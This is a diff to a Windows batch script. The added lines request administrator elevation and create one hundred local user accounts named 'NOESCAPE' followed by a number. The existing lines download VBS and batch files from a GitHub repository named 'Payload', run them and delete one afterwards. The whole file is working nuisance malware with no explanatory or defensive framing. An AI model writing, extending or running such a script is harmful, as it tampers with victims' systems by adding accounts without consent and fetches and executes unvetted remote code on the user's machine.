@@ -1,3 +1,28 @@
+@echo off
+:: Check for admin rights
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Requesting administrative privileges...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit
+)
+
+Set /a loop = 0
+
+:loopstart
+ping 127.0.0.1 -n 1 -w 50 >nul
+net user NOESCAPE%loop% /add
+
+ping 127.0.0.1 -n 1 -w 50 >nul
+goto check
+
+:check
+if %loop% == 100 goto done
+echo %loop%
+Set /a loop += 1
+goto loopstart
+
+:done
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat
@@ -17,3 +42,4 @@ start talk1.vbs
 timeout 6 > nul
 del /f /q "talk1.vbs"
 start Payload.bat
+
